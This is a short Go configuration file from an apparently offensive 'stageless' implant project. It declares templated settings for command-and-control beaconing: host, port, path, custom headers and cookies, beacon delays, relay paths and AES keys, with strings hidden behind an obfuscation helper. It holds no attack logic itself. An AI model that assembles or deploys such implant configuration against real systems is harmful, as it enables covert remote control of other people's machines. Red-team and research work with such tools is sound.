package global

import (
	"stageless/utils/obf"
)

var (
	Channel                = obf.S("<channel>")
	Host                   = obf.S("<host>")
	Port                   = obf.S("<port>")
	Path                   = obf.S("<path>")
	HostTag                = obf.S("<hostTag>")
	BodyContent            = map[string]string{}
	CustomCommunication    = obf.S("<customCommunication>")
	ServerResponseTemplate = obf.S("<serverResponseTemplate>")
	CustomCookies          = map[string]string{}
	CustomHeaders          = map[string]string{}
	BeaconDelay            = 867530901
	SecondDelay            = 867530904
	SecondDelayEnabled     = 867530905
	RelayTimeout           = 5 * 60 * 1000
	PipelineTarget         = obf.S("<pipelineTarget>")
	AesKey                 = "<aesKey>"
	AesRelayKey            = "<aesRelayKey>"
	BgWorkers              int32 = 0
	ActiveRelayPaths       []string
)
